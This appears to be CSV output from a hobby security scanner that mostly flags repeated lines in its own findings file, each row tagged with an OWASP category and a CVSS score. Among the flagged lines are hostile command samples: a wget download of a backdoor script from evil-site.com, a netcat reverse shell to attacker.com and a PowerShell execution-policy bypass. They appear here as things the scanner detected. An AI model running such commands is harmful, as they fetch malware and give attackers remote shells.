Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1650,"""remediation"": ""Enforce strong password policies."","
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1666,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1674,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1682,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1690,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1698,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1706,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1714,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1722,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1730,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1738,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1746,"""content"": ""INFO AWS key found: AKIA1234567890ABCDE"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1775,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1783,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1791,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1799,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1807,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1815,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1823,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1831,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1839,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1847,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1855,"""content"": ""WARN Admin endpoint accessed: /admin/dashboard"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1884,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1892,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1900,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1908,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1916,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1924,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1932,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1940,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1948,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1956,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1964,"""content"": ""WARN Shell execution detection: os.system(cmd)"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1993,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2001,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2009,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2017,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2025,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2033,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2041,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2049,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2057,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2065,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2073,"""content"": ""WARN wget http://evil-site.com/backdoor.sh"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2102,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2110,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2118,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2126,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2134,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2142,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2150,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2158,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2166,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2174,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2182,"""content"": ""WARN nc -e /bin/sh attacker.com 4444"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2211,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2219,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2227,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2235,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2243,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2251,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2259,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2267,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2275,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2283,"""content"": ""ERROR Default credentials detected admin:admin"""
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2291,"""content"": ""ERROR Default credentials detected admin:admin"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2320,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2328,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2336,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2344,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2352,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2360,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2368,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2376,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2384,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2392,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2400,"""content"": ""ERROR Unsafe deserialization: pickle.loads(user_data)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2429,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2437,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2445,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2453,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2461,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2469,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2477,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2485,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2493,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2501,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2509,"""content"": ""CRITICAL Dangerous eval detected: eval(user_input)"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2538,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2546,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2554,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2562,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2570,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2578,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2586,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2594,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2602,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2610,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2618,"""content"": ""ALERT powershell.exe -ExecutionPolicy Bypass"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2624,"""finding"": ""token"","
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2647,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2655,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2663,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2671,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2679,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2687,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2695,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2703,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2711,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2719,"""content"": ""ALERT github_token found in config"""
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2727,"""content"": ""ALERT github_token found in config"""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3496,"""finding"": ""password"","
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3519,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3527,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3535,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3543,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3551,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3559,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3567,"""content"": ""\""file\"": \""/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\"","""
